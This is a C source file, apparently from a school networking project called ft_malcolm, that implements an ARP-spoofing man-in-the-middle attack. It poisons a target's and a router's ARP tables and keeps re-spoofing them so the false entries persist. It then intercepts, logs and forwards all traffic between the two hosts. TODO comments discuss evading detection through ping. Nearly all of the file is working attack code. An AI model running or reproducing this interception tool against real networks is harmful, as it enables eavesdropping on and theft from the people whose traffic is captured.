
#include <ft_malcolm.h>
#include <arp.h>
#include <ftlibc.h>

# include <netinet/if_ether.h>
# include <signal.h>
# include <sys/time.h>
# include <sys/socket.h>
# include <arpa/inet.h>
# include <linux/if_packet.h>
# include <sys/select.h>

# define MAX(x, y) ((x) > (y) ? (x) : (y))
# define ISBROADCAST(x) ( (x)[0] == 0XFF && (x)[1] == 0XFF && (x)[2] == 0XFF && (x)[3] == 0XFF && (x)[4] == 0XFF && (x)[5] == 0XFF )
# define ISSAMEMAC(x, y) ( (x)[0] == (y)[0] && (x)[1] == (y)[1] && (x)[2] == (y)[2] && (x)[3] == (y)[3] && (x)[4] == (y)[4] && (x)[5] == (y)[5] )

///TODO: Problem with ping -> dest ping send me the replies twice
///MAYBE:
    //      <target1> -- ping --> <me> --> <target2>
    //      <target2> -- replies --> <me> --> <target1>
    //
    //  AND ALSO:
    //
    //      <target1> -- ping --> <target2> (somehow)
    //      <target2> -- replies --> <target1> 
    //      <target2> -- replies --> <me> --> <target1> (cause my mac is also in the ip)
    //
    //  LOG:
    //  4 ping duplicates (exactly what i have)
    //
    // SOLUTION: How is possible that:
    //      <target1> -- ping --> <target2> (somehow)

///MAYBE: Is only ping that detect my mitm (but i can bybass it ignoring icmp forward)

///TODO: Try to bypass ping command detection
///TODO: Test better netcat tcp

__attribute__ ((always_inline))
static inline err_t handle_broadcast_arp(const struct ethhdr* const eth, proginfo_t *const info,
const uint8_t* const router_mac, const uint8_t* const target_mac)
{
    err_t st = SUCCESS;

    if (ISBROADCAST(eth->h_dest))
    {
        if (ISSAMEMAC(eth->h_source, router_mac))
        {
            st = send_request_router_unicast(info);
            if (st != SUCCESS)
                goto error;
            st = spoof_router(info);
        }
        else if (ISSAMEMAC(eth->h_source, target_mac))
        {
            st = send_request_target_unicast(info);
            if (st != SUCCESS)
                goto error;
            st = spoof_target(info);
        }
    }
error:
    return st;
}

__attribute__ ((always_inline))
static inline err_t handle_unicast_arp(uint16_t protocol, struct sockaddr_ll *sll, proginfo_t *const info,
const uint8_t* const router_mac, const uint8_t* const target_mac)
{
    err_t st = SUCCESS;

    if (ntohs(protocol) == ARP_REQUEST)
    {
        if (*(uint64_t*)sll->sll_addr == *(uint64_t*)router_mac)
            st = spoof_router(info);
        else if (*(uint64_t*)sll->sll_addr == *(uint64_t*)target_mac)
            st = spoof_target(info);
    }
    else if (ntohs(protocol) == ARP_REPLY)
    {
        if (*(uint64_t*)sll->sll_addr == *(uint64_t*)router_mac)
        {
            st = send_request_target_unicast(info);
            if (st != SUCCESS)
                goto error;
            st = spoof_target(info);
        }
         else if (*(uint64_t*)sll->sll_addr == *(uint64_t*)target_mac)
         {
            st = send_request_router_unicast(info);
            if (st != SUCCESS)
                goto error;
            st = spoof_router(info);
         }
    }
error:
    return st;
}

static err_t handle_arp_packets(proginfo_t *info, const uint8_t* const router_mac, const uint8_t* const target_mac)
{
    err_t st = SUCCESS;
    static uint8_t buff[0X1000];
    struct ethhdr *const eth = (struct ethhdr *)buff;
    struct sockaddr_ll sll;

    ft_memset(buff, 0, sizeof(buff) / sizeof(*buff));

    const ssize_t recvbytes = recvfrom(info->sockarp, buff, sizeof(buff) / sizeof(*buff), 0, (struct sockaddr*)&sll, (socklen_t[]){sizeof(sll)});

    if (recvbytes < 0)
    {
        PRINT_ERROR(MSG_ERROR_SYSCALL, "recvfrom");
        st = INVSYSCALL;
        goto error;
    }
    else if (recvbytes < sizeof(struct ethhdr))
        goto error;

    if (eth->h_proto == ntohs(ETH_P_ARP))
    {
        const struct ether_arp* const arp = (const struct ether_arp*)(buff + sizeof(*eth));

        const uint16_t protocol = arp->arp_op;

        uint8_t src_mac[SIZEOFMAC + 2] = {0};
        ft_memcpy(src_mac, getmacfromstr(info->mymachine.mac), SIZEOFMAC);
        uint8_t src_ip[SIZEOFIP] = {0};
        ft_memcpy(src_ip, getipfromstr(info->mymachine.ip), SIZEOFIP);

        ///TODO: How did they get my ip ???
        if (ntohs(protocol) == ARP_REQUEST && *(uint32_t*)arp->arp_tpa == *(uint32_t*)src_ip)
        {
            printf("[DEBUG] ARP REQUEST FROM ME <---- (looking for me) \n");
            goto error;
        }

        // if (ntohs(protocol) == ARP_REQUEST)
        // {
        //     printf("DEBUG: ARP REQUEST from mac: <");
        //     PRINT_MAC(arp->arp_sha, 0);
        //     printf("> to mac: <");
        //     PRINT_MAC(arp->arp_tha, 0);
        //     printf("> looking for ip: <");
        //     PRINT_IP(arp->arp_tpa, 0);
        //     printf("> (eth src: <");
        //     PRINT_MAC(eth->h_source, 0);
        //     printf(">, eth: dest: <");
        //     PRINT_MAC(eth->h_dest, 0);
        //     printf(">)\n");
        // }

        st = corrupt_my_mac_in_router(info);
        if (st != SUCCESS)
            goto error;
        st = corrupt_my_mac_in_target(info);
        if (st != SUCCESS)
            goto error;

        /* Whether a broadcast is performed the suplanted host will reply too */
        st = handle_broadcast_arp(eth, info, router_mac, target_mac);
        if (st != SUCCESS)
            goto error;
        /* Constantly answer from replies and request to never be erased from targets's ARP table */
        st = handle_unicast_arp(protocol, &sll, info, router_mac, target_mac);
    }

error:
    return st;
}

static err_t forward_packet(int sockfd, uint8_t *const packet, ssize_t packetlen, const struct sockaddr_ll *dest)
{
    err_t st = SUCCESS;

    const ssize_t sentbytes = sendto(sockfd, packet, packetlen, 0, (struct sockaddr*)dest, sizeof(*dest));

    if (sentbytes < 0)
    {
        PRINT_ERROR(MSG_ERROR_SYSCALL, "sendto");
        st = INVSYSCALL;
    }
    else if (sentbytes != packetlen)
    {
        PRINT_ERROR(__progname "%s\n", ": error: forwarded packet is corrupted. Unpoison and exit.");
        st = INVPACKETLEN;
    }
    return st;
}


static err_t handle_ip_packets(const proginfo_t* const info, bool isstdout,
const uint8_t* const router_mac, const uint8_t* const target_mac)
{
    err_t st = SUCCESS;
    struct sockaddr_ll sll;
    ssize_t recvbytes = 0;
    static uint8_t buff[0X10000];
    struct ethhdr *const eth = (struct ethhdr *)buff;

    if ((recvbytes = recvfrom(info->sockip, buff, sizeof(buff) / sizeof(*buff), 0, (struct sockaddr*)&sll, (socklen_t[]){sizeof(sll)})) < 0)
    {
        PRINT_ERROR(MSG_ERROR_SYSCALL, "recvfrom");
        st = INVSYSCALL;
        goto error;
    }

    /* (filter) Log/forward only packet from target or router */
    if (*(uint64_t*)sll.sll_addr == *(uint64_t*)router_mac)
    {
        /* Log packet's matadada and payload */
        log_content(buff, recvbytes, isstdout);

        /* Overwritte the src's MAC address with mine */
        ft_memcpy(sll.sll_addr, getmacfromstr(info->mymachine.mac), SIZEOFMAC);
        ft_memcpy(eth->h_source, getmacfromstr(info->mymachine.mac), SIZEOFMAC);
        ft_memcpy(eth->h_dest, getmacfromstr(info->target.mac), SIZEOFMAC);

        /* Sent packet to its destination (in victim's point of view) */
        if ((st = forward_packet(info->sockip, buff, recvbytes, &sll)) != SUCCESS)
            goto error;
    }
    else if (*(uint64_t*)sll.sll_addr == *(uint64_t*)target_mac)
    {
        log_content(buff, recvbytes, isstdout);
        ft_memcpy(sll.sll_addr, getmacfromstr(info->mymachine.mac), SIZEOFMAC);
        ft_memcpy(eth->h_source, getmacfromstr(info->mymachine.mac), SIZEOFMAC);
        ft_memcpy(eth->h_dest, getmacfromstr(info->router.mac), SIZEOFMAC);
        if ((st = forward_packet(info->sockip, buff, recvbytes, &sll)) != SUCCESS)
            goto error;
    }

    ft_memset(buff, 0, recvbytes);

error:
    return st;
}

err_t man_in_the_middle(const char *av[], const proginfo_t *const info, volatile sig_atomic_t *unpoinson)
{
    err_t st = SUCCESS;
    bool isstdout = false;

    /* Parse router's IP and MAC address, also stdout option */
    PRINT_INFO(__progname ": %s\n", "Launching man in the middle functionality.");
    if ((st = parse_optional_args(av, (proginfo_t*)info, &isstdout)) != SUCCESS)
        goto error;

    /* Spoof my MAC address into router's ARP table at target's ip index*/
    PRINT_INFO("Spoofing srcs's MAC address (`%s\') into target %s\'s ARP table ...\n", info->mymachine.mac, info->router.ip);
    if ((send_request_before_spoof_router(info)) != SUCCESS
    || (st = spoof_router(info)) != SUCCESS)
        goto error;
    PRINT_INFO("%s\n", "Done");

    /* Try to always unpoison target & router if the program is interrupted */
    *unpoinson = true;

    /* Spoof my MAC address into router's ARP table at target's ip index*/
    PRINT_INFO("Spoofing srcs's MAC address (`%s\') into target %s\'s ARP table ...\n", info->mymachine.mac, info->target.ip);
    if ((st = send_request_before_spoof_target(info)) != SUCCESS
    || (st = spoof_target(info)) != SUCCESS)
        goto error;
    PRINT_INFO("%s\n", "Done");

    PRINT_INFO("Intercepting and loggin target's (`%s\' <-> `%s\') comunication, press ctrl^C to end.\n", info->target.ip, info->router.ip);

    uint8_t router_mac[SIZEOFMAC + 2] = {0};
    ft_memcpy(router_mac, getmacfromstr(info->router.mac), SIZEOFMAC);
    uint8_t target_mac[SIZEOFMAC + 2] = {0};
    ft_memcpy(target_mac, getmacfromstr(info->target.mac), SIZEOFMAC);

    for ( ; ; )
    {
        fd_set sfdr;

        FD_ZERO(&sfdr);
        FD_SET(info->sockarp, &sfdr);
        FD_SET(info->sockip, &sfdr);

        if (select(MAX(info->sockip, info->sockarp) + 1, &sfdr, 0, 0, 0) < 0)
        {
            PRINT_ERROR(MSG_ERROR_SYSCALL,"select");
            st = INVSYSCALL;
            goto error;
        }

        if (FD_ISSET(info->sockarp, &sfdr) == true)
        {
            if ((st = handle_arp_packets((proginfo_t*)info, router_mac, target_mac)) != SUCCESS)
                goto error;
        }
        if (FD_ISSET(info->sockip, &sfdr) == true)
        {
            if ((st = handle_ip_packets(info, isstdout, router_mac, target_mac)) != SUCCESS)
                goto error;
        }
    }

error:
    return st;
}
